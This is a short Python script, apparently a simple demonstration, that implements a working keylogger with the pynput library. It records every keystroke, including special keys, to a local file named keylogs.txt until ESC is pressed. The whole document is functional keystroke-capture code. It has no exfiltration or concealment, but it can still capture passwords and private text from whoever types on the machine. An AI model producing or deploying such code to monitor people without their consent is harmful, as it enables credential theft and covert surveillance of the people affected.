# Import the required module
from pynput import keyboard

# File where keystrokes will be logged
log_file = "keylogs.txt"

# Function to write keystrokes to the file
def on_press(key):
    try:
        # Try to write the character if it's a standard key
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # For special keys (like shift, enter, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

# Function to stop listener on pressing ESC
def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop the listener

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
